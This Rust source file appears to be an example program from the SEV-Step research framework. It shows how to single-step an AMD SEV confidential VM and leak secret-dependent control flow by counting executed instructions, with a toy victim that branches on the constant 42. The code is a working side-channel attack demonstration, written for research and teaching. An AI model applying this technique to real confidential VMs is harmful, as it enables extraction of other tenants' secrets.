//!This program shows how to use the SEV-Step framework to exploit secret dependent control flow
//! leakage via single stepping. In addition, it shows how to quickly prototype attacks using
//! attacker defined assembly code snippets.

use anyhow::{bail, Context, Result};
use clap::Parser;
use crossbeam::channel::bounded;
use iced_x86::code_asm::*;
use log::debug;
use sev_step_lib::api::{Event, SevStepError};
use sev_step_lib::single_stepper::{
    BuildStepHistogram, EventHandler, SimpleCallbackAfterNSingleStepsHandler,
    SkipIfNotOnTargetGPAs, StopAfterNSingleStepsHandler, TargetedStepper,
};
use sev_step_lib::{
    api::SevStep,
    config, vm_setup_helpers,
    vmserver_client::{self},
};
use std::time::Duration;
use vm_server::req_resp::InitAssemblyTargetReq;

/// Builds a dummy program that compares `guess``
/// to the "secret" constant 42. If the guess is correct, a branch with two NOPs and a RET is
/// executed, otherwise only a RET is executed. This is intended as an example,
/// how single stepping can be used to leak a secret via counting the amount of executed instructions
fn build_cf_victim(guess: u64) -> Result<InitAssemblyTargetReq> {
    let mut a = CodeAssembler::new(64)?;

    let mut wrong_guess = a.create_label();
    a.mov(rax, 42_u64)?;
    a.mov(rsi, guess)?;
    a.cmp(rax, rsi)?;
    a.jne(wrong_guess)?;
    a.nop()?;
    a.nop()?;
    a.ret()?;
    a.set_label(&mut wrong_guess)?;
    a.ret()?;

    Ok(InitAssemblyTargetReq {
        code: a.take_instructions(),
        required_mem_bytes: 0,
    })
}
///This program demonstrates how to use the SEV-Step API to infer secret dependent control flow.
/// It instructs the VM to execute a small program that branches on the value provided
/// in the `guess_for_secret_input` argument. If the user inputs 42, the
/// observed program will execute `7` instructions, otherwise `5`.
/// In addition, this program shows how to execute a callback function after
/// the victim has executed a certain amount of steps.
#[derive(Parser, Debug)]
struct CliArgs {
    /// Path to vm config file
    #[arg(short, long, default_value = "./sev_step_lib/vm-config.toml")]
    vm_config_path: String,
    /// APIC timer value for single-stepping
    #[arg(short='t',long,value_parser=clap_num::maybe_hex::<u32>)]
    apic_timer_value: Option<u32>,
    /// Input to victim program. See Program documentation
    #[arg(long)]
    guess_for_secret_input: u64,
}

fn main() -> Result<()> {
    env_logger::init();

    //parse args
    let args = CliArgs::parse();
    let vm_config =
        config::parse_config(&args.vm_config_path).context("failed to parse vm config")?;

    //To properly control the APIC timer, the victim VM must be pinned to a fixed core, that is isolated from the rest of the sytem. Isolating the core is described in this library's README.
    //In order to pin the VM to a CPU core, we use the QMP interface of QEMU, to look up the PID/TID of the process
    //that runs the VM's vCPU. Then we pin this process to a fixed core
    debug!("main running with debug logging!");
    let vcpu_thread_id = vm_setup_helpers::get_vcpu_thread_id(&vm_config.qemu_qmp_address)
        .context("failed to get VCPU thread id")?;
    debug!("vcpu_thread_id is {}", vcpu_thread_id);

    vm_setup_helpers::pin_pid_to_cpu(vcpu_thread_id, vm_config.vm_cpu_core).context(format!(
        "failed to pin vcpu (tid {}) to core {}",
        vcpu_thread_id, vm_config.vm_cpu_core,
    ))?;
    debug!(
        "Pinned vcpu_thread (tid {}) to core {}",
        vcpu_thread_id, vm_config.vm_cpu_core
    );

    //In this example we use the VM server that comes with SEV-Step. This component
    //is intended to quickly test attack ideas/scenarios. It allows us to first JIT assemble a
    //victim program using the `iced-x86` crate and subsequently load it to page aligned memory inside
    //the VM. (you could also build a binary with your favourite assembler and load the raw bytes here)
    //In the response to the request, we get the GPA where our program is located.
    //After setting up some kind of tracking logic, we can request the execution of our program
    let victim = build_cf_victim(args.guess_for_secret_input)?;

    let victim_program =
        vmserver_client::new_assembly_target(&vm_config.vm_server_address, &victim).context(
            format!("rquest to create assembly target {:?} failed", victim),
        )?;

    //Next we initialize the SEV-Step API. We pass in a channel that is hooked to CTR-C in order to terminate
    //the API connection at any time
    let (tx, abort_chan) = bounded(1);
    ctrlc::set_handler(move || tx.send(()).expect("Could not send signal on channel."))
        .expect("Error setting Ctrl-C handler");
    let sev_step = SevStep::new(false, abort_chan.clone(), true)?;

    /* Now it is time to build the actual attack logic. For this we use SEV-Step's
     * re-usable event handlers abstractions.
     * Similar to HTTP middlewares, we can specify functions (or use existing ones
     * provided by SEV-Step) that are called in a chain for each event.
     * N.B. This is still quite experimental. There are two design ideas. The one used in this
     * example is more lightweight and defined in `sev_step_lib/src/single_stepper.rs`. There is
     * also a second design draft in `sev_step_lib/src/event_handlers.rs` that supports more complex behaviour
     */

    //only single step if we are executing pages belonging to our victim program
    let mut single_step_target_gpa_only = SkipIfNotOnTargetGPAs::new(
        &[victim_program.code_paddr as u64],
        sev_step_lib::types::kvm_page_track_mode::KVM_PAGE_TRACK_EXEC,
        args.apic_timer_value.unwrap(),
    );

    //record the size of all encountered steps
    let mut step_histogram = BuildStepHistogram::new();

    //stop after a certain amount of steps. Here this is just a safeguard to prevent high runtime in case something goes horribly wrong (i.e. zero step loop)
    let mut stop_stepping = StopAfterNSingleStepsHandler::new(10, None);

    let mut dummy_callback = SimpleCallbackAfterNSingleStepsHandler::new(vec![(
        |steps: &usize| *steps == 2, //this controls
        |_: &mut SevStep, e: &Event| {
            println!("This is an example for a callback function that gets executed after the victim has performed 2 steps {:?}", e);
            Ok(())
        },
    )]);

    let handler_chain: Vec<&mut dyn EventHandler> = vec![
        &mut single_step_target_gpa_only,
        &mut step_histogram,
        &mut stop_stepping,
        &mut dummy_callback,
    ];

    //orchestrates the execution by
    // 1) Setting up the initial tracking
    // 2) Triggering the execution of the victim
    // 3) Handling the generated events with our `handler_chain`
    let stepper = TargetedStepper::new(
        sev_step,
        handler_chain,
        sev_step_lib::types::kvm_page_track_mode::KVM_PAGE_TRACK_EXEC,
        vec![victim_program.code_paddr as u64],
        move || {
            vmserver_client::run_target_program(&vm_config.vm_server_address)
                .context("failed to start victim_wrong_guess")
        },
        Some(Duration::from_secs(1)),
    );

    match stepper.run() {
        Ok(_) => (),
        Err(SevStepError::Timeout) => {
            println!("Stepper terminated with timeout error. Target was probably done")
        }
        Err(e) => bail!(e),
    }

    println!("Done! Step histogram: {}", step_histogram);
    match step_histogram.get_values()[&1] {
        7 => println!("Victim executed 7 instructions. You guessed the secret correct"),
        5 => println!("Victim executed 5 instructions. You did not guess the correct secret"),
        v => bail!(
            "Victim executed an unexpected number of instructions : {}",
            v
        ),
    }

    Ok(())
}
